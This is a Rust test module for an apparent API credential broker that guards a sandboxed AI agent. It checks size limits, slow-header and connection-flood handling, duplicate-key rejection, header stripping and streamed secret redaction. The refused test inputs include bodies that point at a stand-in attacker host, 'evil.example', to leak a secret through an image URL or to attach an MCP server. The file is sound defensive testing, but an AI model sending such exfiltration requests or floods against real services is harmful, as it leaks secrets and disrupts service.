        let huge = format!("POST /t/{k}/anthropic/v1/messages HTTP/1.1\r\nhost: x\r\ncontent-length: {}\r\n\r\n", 40 << 20);
        let out = ask(huge).await;
        assert!(out.starts_with("HTTP/1.1 413"), "{out}");
        assert!(t.elapsed() < Duration::from_secs(5));

        // B-22: a head that never finishes is cut off after HEADER_TIMEOUT; meanwhile others are served
        let slow = {
            let sock = sock.clone();
            tokio::spawn(async move {
                let mut s = tokio::net::UnixStream::connect(&sock).await.unwrap();
                s.write_all(b"POST /t/").await.unwrap();
                let t = std::time::Instant::now();
                let mut out = Vec::new();
                let _ = tokio::time::timeout(HEADER_TIMEOUT * 3, s.read_to_end(&mut out)).await;
                t.elapsed()
            })
        };
        tokio::time::sleep(Duration::from_millis(300)).await;
        assert!(ask(good.clone()).await.starts_with("HTTP/1.1 200"), "served while a slow head waits");
        let waited = slow.await.unwrap();
        assert!(waited < HEADER_TIMEOUT * 2, "the slow head was cut off after {waited:?}");

        // B-22c: a flood past MAX_CONNECTIONS; the extra connections are closed at once
        let mut held = Vec::new();
        for _ in 0..MAX_CONNECTIONS {
            let mut s = tokio::net::UnixStream::connect(&sock).await.unwrap();
            s.write_all(b"POST /t/").await.unwrap();
            held.push(s);
        }
        tokio::time::sleep(Duration::from_millis(200)).await;
        let mut extra = tokio::net::UnixStream::connect(&sock).await.unwrap();
        let _ = extra.write_all(good.as_bytes()).await;
        let mut buf = Vec::new();
        let r = tokio::time::timeout(Duration::from_secs(5), extra.read_to_end(&mut buf)).await;
        assert!(r.is_ok() && buf.is_empty(), "a connection past the limit is closed, not queued: {:?}", String::from_utf8_lossy(&buf));
        drop(held);
        tokio::time::sleep(Duration::from_millis(300)).await;
        assert!(ask(good.clone()).await.starts_with("HTTP/1.1 200"), "served once the flood is gone");

        // Bounded memory: nothing above held more than a few MB
        let grew = rss_kb().saturating_sub(base);
        assert!(grew < 64 << 10, "the broker grew by {grew} KB");
        assert_eq!(seen.auth.lock().unwrap().len(), 3, "only the three plain calls reached the upstream");
        b.close_all().await;
    }

    #[test]
    fn a_repeated_key_is_refused_at_any_depth() {
        let dup = [
            r#"{"model":"m","model":"n"}"#,
            r#"{"tools":[{"name":"a","type":"custom","type":"web_search_20250305"}]}"#,
            r#"{"messages":[{"role":"user","content":[{"type":"text","text":"a","type":"image"}]}]}"#,
            r#"{"tools":[],"tools":[{"type":"web_search_20250305","name":"w"}]}"#,
            r#"{"a":{"b":{"c":1,"c":2}}}"#,
        ];
        for body in dup {
            assert!(parse_strict(body.as_bytes()).is_err(), "{body}");
            let d = check_messages_body(body.as_bytes()).unwrap_err();
            assert_eq!((d.status, d.code), (StatusCode::BAD_REQUEST, codes::BAD_REQUEST), "{body}");
        }
        // Same names in different objects are fine; so are escapes that only look alike
        let ok = r#"{"messages":[{"role":"user","content":"a"},{"role":"assistant","content":"b"}],"tools":[{"name":"x"}]}"#;
        assert_eq!(parse_strict(ok.as_bytes()).unwrap(), serde_json::from_str::<Value>(ok).unwrap());
        assert!(parse_strict(br#"{"a":1,"\u0061":2}"#).is_err(), "an escaped name is the same key");
        assert!(parse_strict(b"{\"a\":1}  trailing").is_err());
        assert!(check_messages_body(ok.as_bytes()).is_ok());
    }

    #[test]
    fn server_tools_mcp_servers_and_fetches_are_refused_with_miras_words() {
        let cases = [
            (r#"{"tools":[{"type":"web_search_20250305","name":"web_search"}]}"#, crate::sandbox::agent_vm::notice::body::SERVER_TOOL),
            (r#"{"tools":[{"type":"web_fetch_20250910","name":"web_fetch"}]}"#, crate::sandbox::agent_vm::notice::body::SERVER_TOOL),
            (r#"{"tools":[{"type":"code_execution_20250825","name":"x"}]}"#, crate::sandbox::agent_vm::notice::body::SERVER_TOOL),
            (r#"{"container":"c1"}"#, crate::sandbox::agent_vm::notice::body::SERVER_TOOL),
            (r#"{"mcp_servers":[{"type":"url","url":"https://evil.example/mcp","name":"e"}]}"#, crate::sandbox::agent_vm::notice::body::MCP_SERVERS),
            (
                r#"{"messages":[{"role":"user","content":[{"type":"image","source":{"type":"url","url":"https://evil.example/?d=secret"}}]}]}"#,
                crate::sandbox::agent_vm::notice::body::FETCH_BY_REFERENCE,
            ),
            (
                r#"{"messages":[{"role":"user","content":[{"type":"document","source":{"type":"file","file_id":"file_1"}}]}]}"#,
                crate::sandbox::agent_vm::notice::body::FETCH_BY_REFERENCE,
            ),
        ];
        for (body, words) in cases {
            let d = check_messages_body(body.as_bytes()).unwrap_err();
            assert_eq!((d.status, d.code), (StatusCode::BAD_REQUEST, codes::SERVER_TOOL_NOT_ALLOWED), "{body}");
            assert_eq!(d.message, words, "{body}");
        }
        let fine = r#"{"model":"claude-haiku","tools":[{"name":"Bash","input_schema":{}},{"type":"custom","name":"x","input_schema":{}}],
            "messages":[{"role":"user","content":[{"type":"image","source":{"type":"base64","media_type":"image/png","data":"AA=="}}]}]}"#;
        assert!(check_messages_body(fine.as_bytes()).is_ok());
    }

    #[test]
    fn unknown_betas_are_stripped_and_only_listed_headers_pass() {
        let mut h = HeaderMap::new();
        h.insert("anthropic-beta", HeaderValue::from_static("claude-code-20250219, mcp-client-2025-04-04,oauth-2025-04-20"));
        h.insert("anthropic-version", HeaderValue::from_static("2023-06-01"));
        h.insert("x-stainless-os", HeaderValue::from_static("Linux"));
        h.insert("x-api-key", HeaderValue::from_static("sk-dummy"));
        h.insert("cookie", HeaderValue::from_static("a=b"));
        h.insert("x-forwarded-for", HeaderValue::from_static("1.2.3.4"));
        let (out, stripped) = anthropic_headers(&h);
        assert_eq!(out["anthropic-beta"], "claude-code-20250219,oauth-2025-04-20");
        assert_eq!(stripped, vec!["mcp-client-2025-04-04".to_string()]);
        assert_eq!(out["anthropic-version"], "2023-06-01");
        assert!(out.contains_key("x-stainless-os"));
        for gone in ["x-api-key", "cookie", "x-forwarded-for", "authorization"] {
            assert!(!out.contains_key(gone), "{gone}");
        }
        // Only unknown betas: the header goes away rather than being sent empty
        let mut h = HeaderMap::new();
        h.insert("anthropic-beta", HeaderValue::from_static("mcp-client-2025-04-04"));
        assert!(!anthropic_headers(&h).0.contains_key("anthropic-beta"));
    }

    #[tokio::test]
    async fn a_stand_in_of_the_other_kind_is_a_409_and_reaches_nothing() {
        let dir = tempfile::tempdir().unwrap();
        let seen = Seen::default();
        let b = broker(&fake_upstream(seen.clone()).await, dir.path());
        let key = b.register(spec("bot-a", Credential::ApiKey(Secret::new("sk-ant-api03-REAL"))));
        let creds = dir.path().join(".credentials.json");
        write_signin(&creds, "sk-ant-oat01-OLD", now_ms() + 3_600_000);
        let oauth = b.register(spec("bot-a", Credential::OAuthFile { path: creds, refresh: true }));
        let path = |l: &TurnLease| format!("/t/{}/anthropic/v1/messages", l.key());
        for (lease, headers) in [
            (&key, BEARER),
            (&key, &[][..]),
            (&key, &[("x-api-key", "d"), ("authorization", "Bearer d")][..]),
            (&oauth, KEY),
            (&oauth, &[][..]),
            (&oauth, &[("authorization", "Basic abc")][..]),
        ] {
            let r = b.handle("bot-a", test_request(Method::POST, &path(lease), headers, "{}")).await;
            assert_eq!(r.status(), StatusCode::CONFLICT, "{headers:?}");
            assert!(body_text(r).await.contains(codes::CREDENTIAL_MISMATCH));
        }
        assert_eq!((key.requests(), oauth.requests()), (0, 0), "a mismatch isn't counted");
        assert!(seen.auth.lock().unwrap().is_empty());
    }

    #[tokio::test]
    async fn the_secret_is_redacted_even_when_split_across_chunks() {
        use futures::StreamExt;
        let secret = b"sk-ant-api03-SECRETSECRET".to_vec();
        let text = b"data: {\"echo\":\"sk-ant-api03-SECRETSECRET\"} and again sk-ant-api03-SECRETSECRET!".to_vec();
        for split in 1..text.len() {
            // every two-chunk split, and one byte at a time
            let chunks: Vec<Result<Bytes, std::io::Error>> =
                vec![Ok(Bytes::copy_from_slice(&text[..split])), Ok(Bytes::copy_from_slice(&text[split..]))];
            let out: Vec<u8> = scrubbed(futures::stream::iter(chunks), secret.clone())
                .map(|c| c.unwrap().to_vec())
                .collect::<Vec<_>>()
                .await
                .concat();
            assert_eq!(out, b"data: {\"echo\":\"[redacted]\"} and again [redacted]!".to_vec(), "split at {split}");
        }
        let bytes: Vec<Result<Bytes, std::io::Error>> = text.iter().map(|b| Ok(Bytes::copy_from_slice(&[*b]))).collect();
        let out: Vec<u8> = scrubbed(futures::stream::iter(bytes), secret.clone()).map(|c| c.unwrap().to_vec()).collect::<Vec<_>>().await.concat();
        assert!(!contains(&out, &secret) && contains(&out, b"[redacted]"));
        // A prefix of the secret at the very end is passed on once the stream ends
        let tail: Vec<Result<Bytes, std::io::Error>> = vec![Ok(Bytes::from_static(b"ok sk-ant"))];
        let out: Vec<u8> = scrubbed(futures::stream::iter(tail), secret).map(|c| c.unwrap().to_vec()).collect::<Vec<_>>().await.concat();
        assert_eq!(out, b"ok sk-ant".to_vec());
    }

    #[test]
    fn kwnt_paths_are_an_exact_list() {
        for ok in ["/api/mcp/self", "/api/mcp/gateway", "/api/mcp/permission/abc_DEF-123"] {
            assert!(kwnt_path_allowed(ok), "{ok}");
        }
        for bad in [
            "/api/mcp/self/", "/api/mcp/selfx", "/api/mcp/gateway/grok", "/api/mcp/permission/", "/api/mcp/permission/a/b",
            "/api/mcp/permission/a.b", "/api/settings/computer", "/api/mcp/servers", "/api/kwants", "/",
        ] {
            assert!(!kwnt_path_allowed(bad), "{bad}");
        }
        assert!(!kwnt_path_allowed(&format!("/api/mcp/permission/{}", "a".repeat(129))));
        assert!(kwnt_path_allowed(&format!("/api/mcp/permission/{}", "a".repeat(128))));
    }

    #[test]
    fn scrub_hashes_long_and_id_like_segments() {
        assert_eq!(scrub_path("/v1/messages?beta=true"), "/v1/messages?beta=true");
        let s = scrub_path("/api/mcp/permission/0123456789abcdef0123456789abcdef");
        assert!(s.starts_with("/api/mcp/permission/h:") && !s.contains("0123456789abcdef"), "{s}");
        assert!(scrub_path("/x?token=abcdefghijklmnop").contains("token=h:"));
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn serves_on_a_private_unix_socket() {
        use std::os::unix::fs::PermissionsExt;
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        let dir = tempfile::tempdir().unwrap();
        let b = broker("http://127.0.0.1:1", dir.path());
        let sock = dir.path().join("run/broker.sock");
        b.listen("bot-a", &sock).await.unwrap();
        assert_eq!(std::fs::metadata(&sock).unwrap().permissions().mode() & 0o777, 0o600);
        assert_eq!(std::fs::metadata(sock.parent().unwrap()).unwrap().permissions().mode() & 0o777, 0o700);
        let mut s = tokio::net::UnixStream::connect(&sock).await.unwrap();
        s.write_all(b"POST /anthropic/v1/messages HTTP/1.1\r\nhost: x\r\ncontent-length: 0\r\nconnection: close\r\n\r\n").await.unwrap();
        let mut out = String::new();
        s.read_to_string(&mut out).await.unwrap();
        assert!(out.starts_with("HTTP/1.1 403") && out.contains(codes::ROUTE_NOT_ALLOWED), "{out}");
        b.close_all().await;
        assert!(!sock.exists());
    }
}
